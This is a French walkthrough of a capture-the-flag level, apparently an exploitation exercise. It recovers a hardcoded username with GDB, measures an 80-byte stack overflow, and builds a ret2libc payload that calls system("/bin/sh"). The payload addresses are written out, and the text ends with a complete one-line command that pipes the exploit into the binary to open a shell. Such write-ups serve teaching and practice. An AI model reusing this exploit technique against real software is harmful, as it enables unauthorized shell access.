## Level 01

### Analyse

La fonction verify_user_name compare l'entrée utilisateur à une chaîne stockée en mémoire.

# Dans GDB, on regarde la chaîne à l'adresse comparée (0x80486a8)
    (gdb) x/s 0x80486a8
    0x80486a8: "dat_wil"

La fonction verify_user_pass compare l'entrée à "admin" (adresse 0x80486b0), mais elle n'est pas bloquante si on exploite le main.

Le main réserve 0x60 (96 octets) sur la pile. Le buffer de mot de passe commence à esp + 0x1c.
Le fgets du mot de passe lit 100 octets, ce qui dépasse la capacité allouée avant d'atteindre l'adresse de retour (EIP).

En envoyant une chaîne et en analysant le crash :

Bash
# Après le crash (Segmentation Fault)
(gdb) info registers eip
eip            0x72796567    0x72796567
L'EIP est écrasé après exactement 80 octets de padding.

### Exploitation

L'objectif est d'utiliser une attaque Ret2Libc pour appeler system("/bin/sh").

1. Récupération des adresses (dans GDB)
Il nous faut trois adresses précises :

system : Pour exécuter la commande.
exit : Pour quitter proprement (optionnel, peut être remplacé par "AAAA").
"/bin/sh" : L'argument à passer à system.

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# 2. Adresse de exit (pour la forme)
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

# 3. Adresse de la chaîne "/bin/sh"
# On cherche dans la libc entre le début de system et la fin de la mémoire mappée
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec

Le payload doit suivre cette structure sur la pile :
[Padding (80 octets)] + [Addr System] + [Addr Exit] + [Addr /bin/sh]

Padding : "A" * 80
System : \xd0\xae\xe6\xf7 (0xf7e6aed0 en Little-Endian)
Exit : \x70\xeb\xe5\xf7 (0xf7e5eb70 en Little-Endian)
Bin/sh : \xec\x97\xf8\xf7 (0xf7f897ec en Little-Endian)

(python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01